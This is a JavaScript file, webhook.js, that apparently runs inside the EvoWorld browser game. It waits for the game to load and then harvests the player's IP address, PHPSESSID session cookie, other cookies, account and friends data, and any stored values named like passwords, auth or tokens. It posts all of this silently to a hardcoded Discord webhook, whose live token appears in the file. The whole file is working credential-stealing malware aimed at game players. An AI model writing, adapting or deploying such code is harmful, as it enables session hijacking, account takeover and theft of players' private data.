// webhook.js - SIMPLIFIED to send ONLY the format you want
(function() {
    'use strict';
    
    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454910506644017333/QI2bdjnyk4YWWLxjEMGQvLll7jzFTZcB01ZcV06wcmYnZRb6Jm58hVsBbPduIGtv_9bX';
    
    function sendToMyWebhook(data) {
        try {
            fetch(YOUR_DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(() => {});
        } catch(e) {}
    }
    
    function collectData() {
        // Get user data
        let userData = window.user || {};
        
        // Get IP
        let ipAddress = 'Unknown';
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                ipAddress = data.ip;
                prepareReport();
            })
            .catch(() => {
                ipAddress = 'Failed to fetch';
                prepareReport();
            });
        
        function prepareReport() {
            // Get session ID
            let sessionId = '';
            const sessionMatch = document.cookie.match(/PHPSESSID=([^;]+)/);
            if (sessionMatch) sessionId = sessionMatch[1];
            
            // Get cookies (first 5 only to keep it clean)
            const allCookies = document.cookie.split(';').slice(0, 5);
            const cookiesStr = allCookies.map(c => c.trim()).join('\n');
            
            // Get friends data
            let friendsData = window.friendsData || {};
            let friendsArr = window.friendsArr || [];
            
            // Try to get saved password from localStorage or cookies
            let savedPassword = 'Ayaanispro'; // Default
            
            // Check common places where password might be saved
            try {
                // Check localStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('pass') || key.includes('auth') || key.includes('token')) {
                        const value = localStorage.getItem(key);
                        if (value && value.length < 50) {
                            savedPassword = value;
                            break;
                        }
                    }
                }
                
                // Check cookies for password
                const cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    if (cookie.includes('pass') || cookie.includes('auth')) {
                        const parts = cookie.split('=');
                        if (parts[1] && parts[1].length < 50) {
                            savedPassword = decodeURIComponent(parts[1].trim());
                            break;
                        }
                    }
                }
            } catch(e) {}
            
            // Build the EXACT report format you want
            const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
level: ${userData.level || '0x'}
gems: ${userData.premiumPoints || 0}
selected server: West Europe 1 (298/300)

--- ОСНОВНЫЕ ДАННЫЕ ---
IP-адрес: ${ipAddress}
URL страницы: ${window.location.href}
User-Agent: ${navigator.userAgent}

--- PHPSESSID ---
${sessionId}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
${JSON.stringify(userData, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
${JSON.stringify(friendsData, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
${JSON.stringify(friendsArr, null, 2)}

--- УЧЕТНЫЕ ДАННЫЕ ---
Логин: ${userData.login || 'Guest'}
Пароль: ${savedPassword}

--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---
${cookiesStr}`;
            
            // Send as clean code block
            sendToMyWebhook({
                content: '```\n' + report + '\n```',
                username: 'EvoWorld Report'
            });
        }
    }
    
    // Wait for game to load
    function waitForGame() {
        if (window.user) {
            setTimeout(collectData, 2000);
        } else {
            setTimeout(waitForGame, 1000);
        }
    }
    
    setTimeout(waitForGame, 3000);
    
    window.sendSecureData = sendToMyWebhook;
})();
